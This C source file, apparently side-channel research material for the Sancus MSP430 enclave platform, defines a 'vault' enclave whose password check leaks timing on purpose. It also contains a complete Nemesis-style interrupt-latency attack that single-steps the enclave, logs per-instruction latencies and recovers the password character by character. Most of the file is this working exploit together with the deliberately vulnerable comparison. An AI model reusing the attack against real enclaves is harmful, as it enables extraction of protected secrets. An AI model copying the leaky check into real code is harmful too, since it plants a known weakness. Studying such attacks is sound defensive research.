#include <sancus_support/sm_io.h>
#include <sancus_support/timer.h>
#include <sancus_support/sancus_step.h>
#include <sancus/sm_support.h>
#include <string.h>
#include <msp430.h>

#define CAT(x) #x
#define BUF_LEN 128
#define MAX_PASSWD_LEN              20
#define MAX_INSTRUCTION_AMOUNT      150
#define BEGIN_CHAR                  '0'
#define END_CHAR                    'z'
void nemesis(void);
void exit_success(void);
void timerA_isr(void);
int char_to_index(char c);

/* ======== VAULT WORLD SM ======== */

DECLARE_SM(vault, 0x1234);
#define VAULT_SECRET_CST    0xbeef
#define VAULT_PW_C1         'c'
#define VAULT_PW_C2         'a'
#define VAULT_PW_C3         'f'
#define VAULT_PW_C4         'e'
#define VAULT_PW_C5         '\0'
#define VAULT_PASSWD        "cafe"
#define VAULT_PASSWD_LEN    5 //8+1 for null byte

int SM_DATA(vault) vault_initialized;
int SM_DATA(vault) vault_secret;
char SM_DATA(vault) vault_passwd[VAULT_PASSWD_LEN];
int const SM_DATA(vault) vault_secret_const = VAULT_SECRET_CST;
char const SM_DATA(vault) vault_passwd_const1 = VAULT_PW_C1;
char const SM_DATA(vault) vault_passwd_const2 = VAULT_PW_C2;
char const SM_DATA(vault) vault_passwd_const3 = VAULT_PW_C3;
char const SM_DATA(vault) vault_passwd_const4 = VAULT_PW_C4;
char const SM_DATA(vault) vault_passwd_const5 = VAULT_PW_C5;

void SM_ENTRY(vault) vault_init()
{
    if (!vault_initialized)
    {
        // copy the constant chars into the buffer for the passwd
        __asm__ __volatile__(   "push r4                        \n\t"
                                "push r5                        \n\t"
                                "mov #vault_passwd, r5          \n\t"
                                "mov #vault_passwd_const1, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "add #1, r5                     \n\t"
                                "mov #vault_passwd_const2, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "add #1, r5                     \n\t"
                                "mov #vault_passwd_const3, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "add #1, r5                     \n\t"
                                "mov #vault_passwd_const4, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "add #1, r5                     \n\t"
                                "mov #vault_passwd_const5, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "pop r5                         \n\t"
                                "pop r4                         \n\t"
                                );
        vault_secret = vault_secret_const;
        vault_initialized = 1;
    }
}

/**
 * Returns 0 on failure, and the secret on success
 * Contains a nemesis style timing sidechannel
 * */
int SM_ENTRY(vault) get_secret(char* provided_passwd)
{
    int len = VAULT_PASSWD_LEN;
    int rv, success = 0;
    
    /*
     * Provided password must match password exactly, including the nullbyte at the end
     * This prevents provided password from being accepted if it starts with passwd
     */
    /*
    for (int i = 0; i < len; i++)
    {
        if (provided_passwd[i] != vault_passwd[i])
            success = 0xfedc;
        else
            __asm__("nop\n\t"); // prevent sidechannel timing attack
    }
    if (!success)
    {
        rv = vault_secret;
    }
    else
    {
        rv = 0;
    }
    */
    /*
     * 
     * r7 = success
     * r8 = provided_passwd[i]
     * index in r9
     * r10 = vault_passwd[i]
     * rv in %0
     * addr to provdided_passwd in %1
     * len in %2
     * 
     */
    __asm__ __volatile__(   "mov #0x0, r7; success = 0      \n\t"
                            "mov #0x0, r9; i = 0            \n\t"
                            "beginLp: cmp r9, %2            \n\t"
                            "jeq endLp                      \n\t"
                            "mov %1, r8                     \n\t"
                            "add r9, r8                     \n\t"
                            "mov r9, r10                    \n\t"
                            "add #vault_passwd, r10         \n\t"
                            "cmp.b @(r8), @(r10)            \n\t"
                            "jeq eqLp                       \n\t"
                            "bis #0x1, r7                   \n\t"
                            "jmp epilogueLp                 \n\t"
                            "eqLp: nop                      \n\t"
                            "nop                            \n\t"
                            "nop                            \n\t"
                            "nop                            \n\t"
                            "epilogueLp: inc r9 ; i++       \n\t"
                            "jmp beginLp ; goto begin       \n\t"
                            "endLp: tst r7; success ?= 0    \n\t"
                            "jz ok                          \n\t"
                            "mov #0x0, %0 ; rv = 0          \n\t"
                            "jmp end3                       \n\t"
                            "ok: mov &vault_secret, %0;     \n\t"
                            "end3: nop                      \n\t"
                            : "=r" (rv)
                            : "r" (provided_passwd), "r" (len)
                            : "r7", "r8", "r9", "r10", "r11");
    
    /*
    
    */
    return rv;
}

void SM_ENTRY(vault) vault_disable(void)
{
    sancus_disable(exit_success);
}

/* ======== UNTRUSTED CONTEXT ======== */

char current[BUF_LEN] = {0};
// tracks length of current guess without null byte
volatile char current_len = 0;
volatile char current_char;

/*
 * Bookkeeping vars for latency tracking
 */
char latencyBuf[END_CHAR - BEGIN_CHAR + 1][MAX_INSTRUCTION_AMOUNT] = {0};
volatile int instruction_count;

int main(void)
{
    // necessary init
    msp430_io_init();
    __asm__ __volatile__("eint\n\t");
    
    // enable sm
    sancus_enable(&vault);
    vault_init();
    
    ASSERT(get_secret(VAULT_PASSWD) == VAULT_SECRET_CST);
    // leak different func
    nemesis();
    vault_disable();
    
}

void nemesis(void)
{
    /*
     * Holds our current guess
     * Assume all passwords are less than BUF_LEN chars
     */
    
    // repeatedly bruteforce one char at a time for timing channel 1
    while (!get_secret(current) && current_len < MAX_PASSWD_LEN)
    {
        char bestChar = '\0';
        char foundBestChar = 0;
        
        for (int c = BEGIN_CHAR; c <= END_CHAR; c++)
        {
            int c_index = char_to_index(c);
            //printf("Clearing entry for %c (%d)\n", c, c_index);
            for (int i = 0; i < MAX_INSTRUCTION_AMOUNT; i++)
            {
                latencyBuf[c_index][i] = 0;
            }
        }
        
        for (current_char = BEGIN_CHAR; current_char <= END_CHAR; current_char++)
        {
            //printf("%c, 0x%.2x\n", current_char, current_char);
            //printf("%c\n", current_char);
            instruction_count = 0;
            //printf("%c, %d\n", current_char, instruction_count);
            current[current_len] = current_char;
            SANCUS_STEP_INIT;
            volatile int v = get_secret(current);
        }
        //printf("%s", "Start checking\n");
        for (int i = 0; i < MAX_INSTRUCTION_AMOUNT; i++)
        {
            char lat1, lat2, lat3;
            lat1 = latencyBuf[0][i];
            lat2 = latencyBuf[1][i];
            lat3 = latencyBuf[2][i];
            //printf("%d\t%d\t%d\n", lat1, lat2, lat3);
            if (lat1 != lat2 && lat2 == lat3)
            {
                bestChar = BEGIN_CHAR;
                foundBestChar = 1;
                break;
            }
            else if (lat1 != lat2 && lat1 == lat3)
            {
                bestChar = BEGIN_CHAR + 1;
                foundBestChar = 1;
                break;
            }
            else if (lat1 == lat2 && lat2 != lat3)
            {
                bestChar = BEGIN_CHAR + 2;
                foundBestChar = 1;
                break;
            }
        }
        
        if (!foundBestChar)
        {
            
            //printf("%s", "Checking the rest\n");
            // RULED OUT first three 
            for (int c_index = 3; c_index <= char_to_index(END_CHAR); c_index++)
            {
                for (int i = 0; i < MAX_INSTRUCTION_AMOUNT; i++)
                {
                    if (latencyBuf[c_index][i] != latencyBuf[0][i])
                    {
                        foundBestChar = 1;
                        bestChar = BEGIN_CHAR + c_index;
                        break;
                    }
                }
            }
        }
        printf("Best char: %c\t0x%.2x\n", bestChar, bestChar);
        // write best char into buf and continue with next char
        current[current_len] = bestChar;
        current_len++;
        //printf("Current: %s\n", current);
    }
    printf("Recovered passwd: %s\n", current);
    TACTL = TACTL_DISABLE;
}

void exit_success(void)
{
    pr_info("SM disabled; all done!");
    EXIT();
}

int char_to_index(char c)
{
    return c - BEGIN_CHAR;
}

/* =========================== TIMER A ISR =============================== */

void timerA_isr(void)
{
    TACTL = TACTL_DISABLE;
    char latency = __ss_isr_tar_entry - HW_IRQ_LATENCY - 1;
    int curr_char_index = char_to_index(current_char);
    latencyBuf[curr_char_index][instruction_count] = latency;
    //printf("latencyBuf (%c, %d, %d): %d\n", current_char, curr_char_index, instruction_count, latency);
    instruction_count += 1;
}


/*
 * NOTE: we use a naked asm function here to be able to store IRQ latency.
 * (Timer_A continues counting from zero after IRQ generation)
 */
__attribute__((naked)) __attribute__((interrupt(TIMER_IRQ_VECTOR)))
void timerA_isr_entry(void)
{
    SANCUS_STEP_ISR(timerA_isr);
}
